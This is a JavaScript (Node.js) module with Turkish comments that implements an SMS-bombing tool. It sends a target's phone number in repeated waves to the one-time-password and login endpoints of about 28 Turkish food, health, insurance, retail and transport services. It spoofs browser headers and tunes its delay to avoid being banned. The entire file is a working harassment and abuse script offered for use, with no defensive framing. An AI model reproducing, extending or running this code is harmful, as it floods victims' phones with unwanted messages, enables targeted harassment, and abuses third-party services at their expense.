const request = require('request');
const chalk = require('chalk');

const headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'Referer': 'https://www.google.com/'
};

async function fire(url, data, label) {
    request.post({ url, headers, json: data, timeout: 5000 }, (err, res, body) => {
        if (!err && res && res.statusCode >= 200 && res.statusCode < 300) {
            console.log(chalk.green(`[+] ${label}: HIT`));
        } else {
            console.log(chalk.red(`[-] ${label}: FAIL`));
        }
    });
}

async function smsBomber(no, amount) {
    const full = "90" + no;

    for (let i = 0; i < amount; i++) {
        console.log(chalk.magenta(`\n[!] Bombalama Dalgası ${i + 1} Başlatılıyor...`));

        // --- PART 1: YEMEK & MARKET (TEKRAR VE GÜNCEL) ---
        fire("https://api.getir.com/v1/auth/otp", { "phone": full }, "Getir");
        fire("https://api.yemeksepeti.com/v1/user/otp", { "phone": no }, "Yemeksepeti");
        fire("https://api-gateway.migros.com.tr/membership-service/v1/otp/send", { "phoneNumber": no }, "Migros");
        fire("https://www.tiklagelsin.com/api/user/login", { "phone": no }, "TiklaGelsin");
        fire("https://pizzalazz.com.tr/api/login/send-otp", { "phone": no }, "PizzaLazz");
        fire("https://www.dominos.com.tr/api/as/v1/customer/login/otp", { "phone": no }, "Dominos");
        fire("https://www.pasaportpizza.com/api/v1/auth/otp", { "phone": no }, "PasaportPizza");

        // --- PART 2: YENİ CEPHANELİK (SAĞLIK & SİGORTA & HİZMET) ---
        fire("https://api.sigortam.net/uyelik/otp-gonder", { "telefon": no }, "SigortamNet");
        fire("https://www.generali.com.tr/api/v1/otp", { "gsm": no }, "Generali");
        fire("https://www.acibadem.com.tr/api/v1/auth/otp", { "phone": no }, "Acibadem");
        fire("https://www.medicalpark.com.tr/api/v1/otp", { "phone": no }, "MedicalPark");
        fire("https://api.armut.com/v1/auth/otp", { "phone": no }, "Armut");
        fire("https://www.sinemahane.com/api/v1/auth", { "phone": no }, "Sinemahane");
        fire("https://www.tazefikir.com/api/otp", { "phone": no }, "Tazefikir");

        // --- PART 3: MODA & KOZMETİK ---
        fire("https://www.lcwaikiki.com/tr-TR/TR/login/send-otp", { "phone": no }, "LCW");
        fire("https://www.defacto.com.tr/customer/send-otp", { "phone": no }, "DeFacto");
        fire("https://www.boyner.com.tr/api/v1/auth/otp", { "phone": no }, "Boyner");
        fire("https://www.flo.com.tr/api/v1/auth/otp", { "phone": no }, "Flo");
        fire("https://www.ebebek.com/api/v1/auth/otp", { "phone": no }, "Ebebek");
        fire("https://www.watsons.com.tr/api/v1/login/otp", { "phone": no }, "Watsons");
        fire("https://www.gratis.com/api/v1/auth/otp", { "phone": no }, "Gratis");

        // --- PART 4: TEKNOLOJİ & DİĞER ---
        fire("https://www.letgo.com/api/v1/auth/otp", { "phone": no }, "Letgo");
        fire("https://api.taksi.com/v1/login/otp", { "phone": no }, "BiTaksi");
        fire("https://www.hopishop.com/api/v1/auth/otp", { "phone": no }, "Hopi");
        fire("https://www.marti.tech/api/v1/auth/otp", { "phone": no }, "Marti");
        fire("https://www.binbin.tech/api/v1/auth/otp", { "phone": no }, "BinBin");
        fire("https://www.itopya.com/api/v1/auth/otp", { "phone": no }, "Itopya");

        // Gecikmeyi biraz düşürdüm ama çok hızlanırsan servisler seni banlar
        await new Promise(resolve => setTimeout(resolve, 1500));
    }
}

module.exports = smsBomber;
